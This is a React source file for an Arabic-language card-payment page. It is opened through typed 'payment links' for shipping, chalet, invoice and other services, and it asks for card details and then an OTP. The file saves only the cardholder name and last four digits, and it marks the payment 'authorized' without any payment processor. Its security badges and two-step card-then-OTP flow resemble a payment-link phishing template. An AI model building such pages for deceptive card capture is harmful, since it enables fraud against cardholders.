import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
import { Shield, CreditCard, Lock, AlertCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import chaletHero from "@/assets/chalet-hero.jpg";
import shippingHero from "@/assets/shipping-hero.jpg";

const PaymentCard = () => {
  const { id, paymentId } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: payment } = usePayment(paymentId);
  const updatePayment = useUpdatePayment();
  const { data: link } = useLink(payment?.link_id || undefined);
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  
  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "");
    const matches = cleaned.match(/.{1,4}/g);
    return matches ? matches.join(" ") : cleaned;
  };
  
  const formatExpiry = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.length >= 2) {
      return cleaned.substring(0, 2) + "/" + cleaned.substring(2, 4);
    }
    return cleaned;
  };
  
  const handleSubmit = async () => {
    if (!cardName || !cardNumber || !expiry || !cvv || !payment) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول",
        variant: "destructive",
      });
      return;
    }
    
    // Extract last 4 digits
    const last4 = cardNumber.replace(/\s/g, "").slice(-4);
    
    // Update payment with card info (NOT storing full PAN/CVV)
    await updatePayment.mutateAsync({
      paymentId: payment.id,
      updates: {
        cardholder_name: cardName,
        last_four: last4,
        status: "authorized",
      },
    });
    
    // Navigate to OTP
    navigate(`/pay/${id}/otp/${payment.id}`);
  };
  
  // Get service-specific image and gradient
  const getServiceImage = () => {
    if (!link) return chaletHero;
    switch (link.type) {
      case 'shipping':
        return shippingHero;
      case 'chalet':
        return chaletHero;
      default:
        return chaletHero;
    }
  };
  
  const getServiceGradient = () => {
    if (!link) return 'var(--gradient-primary)';
    switch (link.type) {
      case 'shipping':
        return 'var(--shipping-gradient)';
      case 'chalet':
        return 'var(--chalet-gradient)';
      case 'invoice':
        return 'var(--invoice-gradient)';
      case 'health':
        return 'var(--health-gradient)';
      case 'logistics':
        return 'var(--logistics-gradient)';
      case 'contract':
        return 'var(--contract-gradient)';
      default:
        return 'var(--gradient-primary)';
    }
  };
  
  return (
    <div className="min-h-screen py-12 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        <div className="max-w-md mx-auto">
          {/* Security Badge */}
          <div className="text-center mb-6">
            <Badge className="text-sm px-4 py-2 bg-gradient-success">
              <Lock className="w-4 h-4 ml-2" />
              <span>معاملة آمنة ومشفّرة</span>
            </Badge>
          </div>
          
          <Card className="p-8 shadow-elevated">
            {/* Service Header with Image */}
            <div
              className="h-32 -mx-8 -mt-8 mb-6 rounded-t-xl flex items-center justify-center relative overflow-hidden"
              style={{
                backgroundImage: `url(${getServiceImage()})`,
                backgroundSize: 'cover',
                backgroundPosition: 'center',
              }}
            >
              <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/50 to-black/70" />
              <div 
                className="absolute inset-0" 
                style={{ background: getServiceGradient(), opacity: 0.5 }}
              />
              <CreditCard className="w-12 h-12 text-white relative z-10 drop-shadow-lg" />
            </div>
            
            <div className="text-center mb-6">
              <h1 className="text-2xl font-bold">بيانات البطاقة</h1>
              <p className="text-sm text-muted-foreground">الدفع الآمن</p>
            </div>
            
            {/* Info Alert */}
            <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-3 mb-6 flex items-start gap-2">
              <AlertCircle className="w-5 h-5 text-blue-500 mt-0.5 flex-shrink-0" />
              <p className="text-sm text-blue-500">
                بياناتك محمية بتقنية التشفير. لا نقوم بحفظ بيانات البطاقة
              </p>
            </div>
            
            <div className="space-y-5">
              {/* Cardholder Name */}
              <div>
                <Label className="mb-2">اسم حامل البطاقة</Label>
                <Input
                  placeholder="AHMAD ALI"
                  value={cardName}
                  onChange={(e) => setCardName(e.target.value.toUpperCase())}
                  className="h-12 text-lg"
                />
              </div>
              
              {/* Card Number */}
              <div>
                <Label className="mb-2">رقم البطاقة</Label>
                <Input
                  placeholder="4242 4242 4242 4242"
                  value={cardNumber}
                  onChange={(e) =>
                    setCardNumber(formatCardNumber(e.target.value.slice(0, 19)))
                  }
                  inputMode="numeric"
                  className="h-12 text-lg tracking-wider"
                />
              </div>
              
              {/* Expiry & CVV */}
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label className="mb-2">تاريخ الانتهاء</Label>
                  <Input
                    placeholder="MM/YY"
                    value={expiry}
                    onChange={(e) =>
                      setExpiry(formatExpiry(e.target.value.slice(0, 4)))
                    }
                    inputMode="numeric"
                    className="h-12 text-lg"
                  />
                </div>
                
                <div>
                  <Label className="mb-2">CVV</Label>
                  <Input
                    placeholder="123"
                    value={cvv}
                    onChange={(e) =>
                      setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
                    }
                    inputMode="numeric"
                    type="password"
                    className="h-12 text-lg"
                  />
                </div>
              </div>
              
              {/* Submit Button */}
              <Button
                size="lg"
                className="w-full text-lg py-7 mt-6"
                onClick={handleSubmit}
                disabled={updatePayment.isPending}
              >
                {updatePayment.isPending ? (
                  <span>جاري التفويض...</span>
                ) : (
                  <>
                    <Shield className="w-5 h-5 ml-2" />
                    <span>تفويض البطاقة</span>
                  </>
                )}
              </Button>
              
              <p className="text-xs text-center text-muted-foreground mt-3">
                سيتم إرسال رمز التحقق إلى هاتفك المسجل
              </p>
            </div>
          </Card>
          
          {/* Security Icons */}
          <div className="flex items-center justify-center gap-6 mt-8 opacity-60">
            <Shield className="w-5 h-5" />
            <Lock className="w-5 h-5" />
            <CreditCard className="w-5 h-5" />
          </div>
        </div>
      </div>
    </div>
  );
};

export default PaymentCard;
